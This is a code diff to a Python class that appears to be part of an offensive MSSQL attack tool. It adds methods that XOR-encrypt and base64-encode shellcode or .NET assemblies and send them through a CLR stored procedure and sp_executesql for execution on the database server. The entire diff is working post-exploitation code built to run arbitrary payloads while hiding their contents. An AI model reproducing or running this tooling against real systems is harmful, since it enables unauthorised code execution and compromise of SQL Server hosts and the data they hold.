@@ -112,15 +112,13 @@ class sql_op:
         if resp and type(resp) == list:
             print(list(resp[0].values())[0])
 
-    def clr_assembly_long(self, command):
+    def clr_exec_long(self, cmd, command):
         sql = """
 DECLARE @longInput NVARCHAR(MAX) = CAST(N'{}' AS NVARCHAR(MAX));
-DECLARE @sql NVARCHAR(MAX) = N'EXEC dbo.{} ''clr_assembly ' + @longInput + N''';';
+DECLARE @sql NVARCHAR(MAX) = N'EXEC dbo.{} ''{} ' + @longInput + N''';';
 EXEC sp_executesql @sql;
-""".format(command, self.procedure_name)
-        resp = self.sql_query(sql)
-        if resp:
-            print(resp)
+""".format(cmd, self.procedure_name, command)
+        self.sql_query(sql)
 
     def create_procedure(self):
         command = """CREATE PROCEDURE [dbo].[{procedure}] @arg NVARCHAR (MAX) AS EXTERNAL NAME [{assembly}].[{assembly_class}].[{method}]""".format(procedure=self.procedure_name, assembly= self.assembly_prefix + self.assembly_name, assembly_class= self.assembly_class_name,method=self.assembly_method_name)
@@ -373,12 +371,9 @@ EXEC sp_OADestroy @ObjectToken;'''.format(hex_data.decode(), path)
         for i in range(len(input_data)):
             buffer_bytes[i] = input_data[i] ^ key_bytes[i % len(key_bytes)]
         return buffer_bytes
-
-    # execute-assembly
-    def execute_assembly(self, input):
+    
+    def execute_shellcode(self, cmd, file):
         try:
-            file = input[0]
-            args = " ".join(input[1:])
             if not os.path.exists(file):
                 logging.error("File {} not found".format(file))
                 return
@@ -386,8 +381,27 @@ EXEC sp_OADestroy @ObjectToken;'''.format(hex_data.decode(), path)
             xor_key = ''.join(random.sample(string.ascii_letters + string.digits, 8))
             xor_key_pass = base64.b64encode(xor_key.encode('utf-8')).decode('utf-8')
             file_payload = base64.b64encode(self.xor_enc_dec(file_data, xor_key)).decode('utf-8')
-            args_pass =  base64.b64encode(self.xor_enc_dec(args.encode('utf-8'), xor_key)).decode('utf-8')
-            self.clr_assembly_long("{} {} {}".format(file_payload, xor_key_pass, args_pass))
+            command = "{} {}".format(file_payload, xor_key_pass)
+            self.clr_exec_long(cmd, command)
+        except Exception as e:
+            logging.error(e)
+            return
+
+    # execute-assembly
+    def execute_assembly(self, cmd, input, type='file'):
+        try:
+            if type=='file':
+                if not os.path.exists(input):
+                    logging.error("File {} not found".format(input))
+                    return
+                file_data = open(input,'rb').read()
+            else:
+                file_data = input
+            xor_key = ''.join(random.sample(string.ascii_letters + string.digits, 8))
+            xor_key_pass = base64.b64encode(xor_key.encode('utf-8')).decode('utf-8')
+            file_payload = base64.b64encode(self.xor_enc_dec(file_data, xor_key)).decode('utf-8')
+            command = "{} {}".format(file_payload, xor_key_pass)
+            self.clr_exec_long(cmd, command)
         except Exception as e:
             logging.error(e)
             return
